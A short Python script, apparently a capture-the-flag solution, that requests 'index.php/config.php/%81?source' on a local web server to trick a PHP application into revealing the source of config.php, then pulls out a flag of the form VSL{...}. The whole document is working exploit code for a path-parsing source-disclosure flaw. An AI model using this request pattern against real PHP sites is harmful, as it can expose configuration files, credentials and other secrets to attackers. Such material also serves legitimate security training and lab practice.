import requests
import re

url = "http://127.0.0.1/index.php/config.php/%81"
response = requests.get(url, params="source")
content = response.text
match = re.search(r'VSL\{([^}]*)\}', content)
if match:
    flag = f"VSL{{{match.group(1)}}}"
    print(f"[+] Done Flag: {flag}")
else:
    print("[-] Failed to find flag.")
